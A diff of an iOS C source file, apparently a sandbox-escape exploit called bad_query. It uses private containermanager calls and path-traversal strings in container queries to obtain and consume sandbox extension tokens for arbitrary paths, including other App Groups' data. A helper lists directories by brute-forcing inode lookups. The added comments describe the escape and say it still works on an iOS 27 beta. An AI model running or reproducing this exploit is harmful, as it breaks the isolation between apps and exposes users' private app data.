@@ -1,15 +1,20 @@
-// Pinned from forcequitOS/bad_query @ 73ef6da1adabef0982fd00e36cb85f21b8f8194a
-// Original implementation by Taj C / forcequitOS.
-// Unsigned/sideload builds only. This source is not part of the TestFlight target.
+//
+//  bad_query.c
+//  bad_query
+//
+//  Created by Taj C on 7/21/26.
+//
 
 #include "bad_query.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <dlfcn.h>
+#include <stdlib.h>
 #include <errno.h>
 #include <string.h>
 #include <sys/stat.h>
 #include <xpc/xpc.h>
+
 #include <sys/mount.h>
 #include <sys/fsgetpath.h>
 
@@ -26,15 +31,18 @@ typedef int64_t (*sandbox_extension_consume_fn)(const char *);
 typedef int (*sandbox_extension_release_fn)(int64_t);
 
 int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
-    if (!path || path[0] != '/') return -255;
+    // Sanity check our path and check if something already exists there
+    if (!path || path[0] != '/') return -255; // Not an absolute path
     if (!create) {
         struct stat st;
-        if (lstat(path, &st) != 0) return -254;
+        if (lstat(path, &st) != 0) return -254; // File is missing, so we'll return
     }
-
+    
+    // Now the fun begins
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
-    if (!mgr) return -1;
-
+    if (!mgr) return -1; // Failed to dlopen
+    
+    // Resolve functions
     container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
     container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
     container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
@@ -45,31 +53,34 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
     container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
     container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
     sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
-
+    
     int64_t handle = -1;
     if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
         dlclose(mgr);
-        return -1;
+        return -1; // Failed to resolve a function
     }
-
+    
+    // Create query
     void *query = query_create();
     if (!query) {
         dlclose(mgr);
-        return -2;
+        return -2; // Failed to create query
     }
-
+    
+    // Set up query
+    // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
     xpc_object_t identifier;
     if (group_identifier == NULL) {
-        query_set_class(query, 13);
+        query_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
         identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
     } else {
-        query_set_class(query, 7);
+        query_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
         identifier = xpc_string_create(group_identifier);
     }
     query_set_group_identifiers(query, identifier);
-    query_set_part(query, 3);
-
+    query_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
     char *part = NULL;
+    // Oldest trick in the book. Basic path traversal.
     if (group_identifier == NULL) {
         if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
             query_set_part_domain(query, part);
@@ -77,48 +88,52 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
             xpc_release(identifier);
             query_free(query);
             dlclose(mgr);
-            return -5;
+            return -5; // asprintf failed for some reason
         }
     } else {
+        // We have to go one level higher to get to / from an App Group
         if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
             query_set_part_domain(query, part);
         } else {
             xpc_release(identifier);
             query_free(query);
             dlclose(mgr);
-            return -5;
+            return -5; // Same thing
         }
     }
-
+    
+    // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
     if (is_group) {
         query_set_flags(query, 0x0000000800000000ULL);
     } else {
         query_set_flags(query, 0x0000008000000000ULL);
     }
-
+    
+    // Send our query over
     void *result = query_get_single_result(query);
     if (!result) {
         free(part);
         xpc_release(identifier);
         query_free(query);
         dlclose(mgr);
-        return -3;
+        return -3; // Outside of sandbox
     }
-
     char *token = copy_sandbox_token(result);
     if (!token) {
         free(part);
         xpc_release(identifier);
         query_free(query);
         dlclose(mgr);
-        return -4;
+        return -4; // Kernel refused to issue a sandbox extension
     }
-
+    
+    // Consume our fresh sandbox extension and clean up
     handle = consume_extension(token);
     free(token);
     free(part);
     xpc_release(identifier);
     query_free(query);
+    
     dlclose(mgr);
     return handle;
 }
@@ -129,36 +144,34 @@ void bad_query_release(int64_t handle) {
     if (release_extension) release_extension(handle);
 }
 
+// This still works on 27.0b5
+// I'm including it here because it's very useful in the context of this sandbox escape, which can't access parent directories (most of the time)
+// This enumerates all directories in a given path, so you can, for example, get all container UUIDs, read their container metadata to get their bundle ID, and derive that entirely on-device without a computer
 char *bad_query_list(char *path, int64_t max_inode) {
     struct statfs sfs;
     if (statfs(path, &sfs) != 0) return NULL;
     fsid_t fsid = sfs.f_fsid;
-
+    
     size_t cap = 65536;
     size_t length = 0;
     size_t path_length = strlen(path);
-
+    
     char *out = malloc(cap);
     if (!out) return NULL;
     out[0] = '\0';
-
+    
     char buf[1200];
-    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
+    for (uint64_t ino = 1; ino <= max_inode; ino++) {
         ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
         if (n <= 0) continue;
-
+        
         const char *p = buf;
         if (strncmp(p, "/private/var/", 13) == 0) p += 8;
         if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
         if (strchr(p + path_length + 1, '/')) continue;
-
+        
         size_t need = strlen(p) + 2;
-        if (length + need > cap) {
-            cap *= 2;
-            char *t = realloc(out, cap);
-            if (!t) break;
-            out = t;
-        }
+        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
         length += snprintf(out + length, cap - length, "%s\n", p);
     }
     return out;
